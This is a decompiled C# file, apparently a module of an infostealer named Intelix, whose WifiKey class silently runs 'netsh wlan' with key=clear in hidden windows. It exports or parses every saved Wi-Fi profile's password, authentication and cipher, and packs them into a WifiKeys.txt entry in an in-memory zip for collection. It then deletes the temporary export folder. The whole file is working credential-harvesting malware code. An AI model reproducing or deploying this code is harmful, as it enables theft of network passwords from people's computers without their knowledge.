using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device
{
	// Token: 0x02000034 RID: 52
	public class WifiKey : ITarget
	{
		// Token: 0x0600009D RID: 157 RVA: 0x0000876C File Offset: 0x0000696C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			WifiKey.WifiInfo[] array = this.TryExportAndParseProfiles() ?? this.FallbackParseProfiles();
			bool flag = array != null && array.Length != 0;
			if (flag)
			{
				int num = Math.Max("Profile".Length, this.MaxLength(array, (WifiKey.WifiInfo r) => r.Profile));
				int num2 = Math.Max("Key".Length, this.MaxLength(array, (WifiKey.WifiInfo r) => r.Key));
				int num3 = Math.Max("Authentication".Length, this.MaxLength(array, (WifiKey.WifiInfo r) => r.Authentication));
				int num4 = Math.Max("Cipher".Length, this.MaxLength(array, (WifiKey.WifiInfo r) => r.Cipher));
				List<string> list = new List<string>
				{
					string.Concat(new string[]
					{
						"Profile".PadRight(num),
						" | ",
						"Key".PadRight(num2),
						" | ",
						"Authentication".PadRight(num3),
						" | ",
						"Cipher".PadRight(num4)
					}),
					new string('-', num + num2 + num3 + num4 + 9)
				};
				WifiKey.WifiInfo[] array2 = array;
				foreach (WifiKey.WifiInfo wifiInfo in array2)
				{
					string text = string.IsNullOrEmpty(wifiInfo.Profile) ? "N/A" : wifiInfo.Profile;
					string text2 = string.IsNullOrEmpty(wifiInfo.Key) ? "Not found" : wifiInfo.Key;
					string text3 = string.IsNullOrEmpty(wifiInfo.Authentication) ? "Not found" : wifiInfo.Authentication;
					string text4 = string.IsNullOrEmpty(wifiInfo.Cipher) ? "Not found" : wifiInfo.Cipher;
					list.Add(string.Concat(new string[]
					{
						text.PadRight(num),
						" | ",
						text2.PadRight(num2),
						" | ",
						text3.PadRight(num3),
						" | ",
						text4.PadRight(num4)
					}));
				}
				zip.AddTextFile("WifiKeys.txt", string.Join("\n", list));
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00008A18 File Offset: 0x00006C18
		private int MaxLength(WifiKey.WifiInfo[] arr, Func<WifiKey.WifiInfo, string> selector)
		{
			bool flag = arr == null || arr.Length == 0;
			int result;
			if (flag)
			{
				result = 0;
			}
			else
			{
				int num = 0;
				for (int i = 0; i < arr.Length; i++)
				{
					string text = selector(arr[i]) ?? "";
					bool flag2 = text.Length > num;
					if (flag2)
					{
						num = text.Length;
					}
				}
				result = num;
			}
			return result;
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00008A88 File Offset: 0x00006C88
		private WifiKey.WifiInfo[] TryExportAndParseProfiles()
		{
			string text = Path.Combine(Path.GetTempPath(), "IntelixWifiExport_" + Guid.NewGuid().ToString("N"));
			try
			{
				Directory.CreateDirectory(text);
			}
			catch
			{
				return null;
			}
			WifiKey.WifiInfo[] result;
			try
			{
				using (Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = "netsh",
						Arguments = "wlan export profile key=clear folder=\"" + text + "\"",
						UseShellExecute = false,
						RedirectStandardOutput = false,
						CreateNoWindow = true
					}
				})
				{
					process.Start();
					process.WaitForExit(5000);
				}
				string[] array = Directory.EnumerateFiles(text, "*.xml").ToArray<string>();
				bool flag = array.Length == 0;
				if (flag)
				{
					result = null;
				}
				else
				{
					List<WifiKey.WifiInfo> list = new List<WifiKey.WifiInfo>(array.Length);
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						try
						{
							XDocument xdocument = XDocument.Load(text2);
							XElement xelement = xdocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "name", StringComparison.OrdinalIgnoreCase) && e.Parent != null && string.Equals(e.Parent.Name.LocalName, "SSID", StringComparison.OrdinalIgnoreCase));
							string text3 = (xelement != null) ? xelement.Value : null;
							bool flag2 = string.IsNullOrEmpty(text3);
							if (flag2)
							{
								text3 = Path.GetFileNameWithoutExtension(text2);
							}
							XElement xelement2 = xdocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "keyMaterial", StringComparison.OrdinalIgnoreCase));
							string text4 = (xelement2 != null) ? xelement2.Value : null;
							XElement xelement3 = xdocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "authentication", StringComparison.OrdinalIgnoreCase));
							string text5 = (xelement3 != null) ? xelement3.Value : null;
							XElement xelement4 = xdocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "encryption", StringComparison.OrdinalIgnoreCase));
							string text6 = (xelement4 != null) ? xelement4.Value : null;
							list.Add(new WifiKey.WifiInfo
							{
								Profile = (text3 ?? "N/A"),
								Key = (string.IsNullOrEmpty(text4) ? "Not found" : text4),
								Authentication = (string.IsNullOrEmpty(text5) ? "Not found" : text5),
								Cipher = (string.IsNullOrEmpty(text6) ? "Not found" : text6)
							});
						}
						catch
						{
						}
					}
					result = list.ToArray();
				}
			}
			catch
			{
				result = null;
			}
			finally
			{
				try
				{
					bool flag3 = Directory.Exists(text);
					if (flag3)
					{
						Directory.Delete(text, true);
					}
				}
				catch
				{
				}
			}
			return result;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00008DDC File Offset: 0x00006FDC
		private WifiKey.WifiInfo[] FallbackParseProfiles()
		{
			string[] profiles = this.Profiles();
			bool flag = profiles == null || profiles.Length == 0;
			WifiKey.WifiInfo[] result;
			if (flag)
			{
				result = new WifiKey.WifiInfo[0];
			}
			else
			{
				WifiKey.WifiInfo[] results = new WifiKey.WifiInfo[profiles.Length];
				Parallel.For(0, profiles.Length, delegate(int i)
				{
					string text = profiles[i];
					try
					{
						using (Process process = new Process
						{
							StartInfo = new ProcessStartInfo
							{
								FileName = "netsh",
								Arguments = "wlan show profile name=\"" + text + "\" key=clear",
								UseShellExecute = false,
								RedirectStandardOutput = true,
								CreateNoWindow = true,
								StandardOutputEncoding = Encoding.UTF8
							}
						})
						{
							process.Start();
							string input = process.StandardOutput.ReadToEnd();
							process.WaitForExit();
							string match = this.GetMatch(input, "Key Content\\s*:\\s*(.+)");
							string match2 = this.GetMatch(input, "Authentication\\s*:\\s*(.+)");
							string match3 = this.GetMatch(input, "Cipher\\s*:\\s*(.+)");
							results[i] = new WifiKey.WifiInfo
							{
								Profile = text,
								Key = (string.IsNullOrEmpty(match) ? "Not found" : match),
								Authentication = (string.IsNullOrEmpty(match2) ? "Not found" : match2),
								Cipher = (string.IsNullOrEmpty(match3) ? "Not found" : match3)
							};
						}
					}
					catch
					{
						results[i] = new WifiKey.WifiInfo
						{
							Profile = text,
							Key = "Error",
							Authentication = "Error",
							Cipher = "Error"
						};
					}
				});
				result = results;
			}
			return result;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00008E60 File Offset: 0x00007060
		private string[] Profiles()
		{
			string[] array2;
			try
			{
				using (Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = "netsh",
						Arguments = "wlan show profiles",
						UseShellExecute = false,
						RedirectStandardOutput = true,
						CreateNoWindow = true,
						StandardOutputEncoding = Encoding.UTF8
					}
				})
				{
					process.Start();
					string text = process.StandardOutput.ReadToEnd();
					process.WaitForExit();
					string[] array = text.Split(new char[]
					{
						'\r',
						'\n'
					}, StringSplitOptions.RemoveEmptyEntries);
					List<string> list = new List<string>();
					array2 = array;
					foreach (string text2 in array2)
					{
						int num = text2.LastIndexOf(':');
						bool flag = num >= 0 && num + 1 < text2.Length;
						if (flag)
						{
							string text3 = text2.Substring(num + 1).Trim();
							bool flag2 = !string.IsNullOrEmpty(text3);
							if (flag2)
							{
								list.Add(text3);
							}
						}
					}
					array2 = list.ToArray();
				}
			}
			catch
			{
				array2 = new string[0];
			}
			return array2;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00008FD0 File Offset: 0x000071D0
		private string GetMatch(string input, string pattern)
		{
			bool flag = string.IsNullOrEmpty(input);
			string result;
			if (flag)
			{
				result = string.Empty;
			}
			else
			{
				Match match = Regex.Match(input, pattern, RegexOptions.IgnoreCase | RegexOptions.Multiline);
				bool flag2 = !match.Success;
				if (flag2)
				{
					result = string.Empty;
				}
				else
				{
					result = match.Groups[1].Value.Trim();
				}
			}
			return result;
		}

		// Token: 0x020000AA RID: 170
		private class WifiInfo
		{
			// Token: 0x0400010B RID: 267
			public string Profile;

			// Token: 0x0400010C RID: 268
			public string Key;

			// Token: 0x0400010D RID: 269
			public string Authentication;

			// Token: 0x0400010E RID: 270
			public string Cipher;
		}
	}
}
